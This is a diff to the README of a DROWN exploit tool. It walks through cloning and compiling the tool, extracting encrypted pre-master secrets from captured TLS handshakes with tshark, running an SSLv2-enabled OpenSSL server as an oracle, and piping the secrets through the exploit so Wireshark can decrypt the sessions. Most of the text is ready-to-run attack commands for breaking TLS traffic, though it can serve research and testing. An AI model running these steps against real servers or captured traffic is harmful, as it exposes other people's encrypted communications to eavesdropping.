@@ -20,9 +20,9 @@ Now let's compile the exploit :
     git clone https://github.com/Tim---/drown
     SSL_PREFIX=/path/to/prefix make
 
-To decrypt an encrypted pre-master secret c, using the public key (n, e) of the server at the address host:port, we will use the following command :
+To decrypt an encrypted pre-master secret c, using the public key of the server at the address host:port, we will use the following command :
 
-    ./drown host:port c n e
+    ./drown host:port certfile c
 
 ## Passive attack
 
@@ -49,4 +49,12 @@ We can now get the encrypted pre-master secrets for each session with :
 
     tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d :
 
-Now we must decrypt these handshakes (to be continued...).
+To decrypt these handshakes, we need an OpenSSL server accepting SSLv2 connections :
+
+    ./bin/openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2
+
+We can now decrypt the encrypted pre-master secrest : 
+    tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d : | ./drown localhost:4434 cert.pem > pms.txt
+
+After some time and if we're lucky, we will have some results in pms.txt. You can use this file in Wireshark to decrypt the content of the TLS session (Protocol Preferences > SSL > (Pre)-Master-Secret log filename).
+
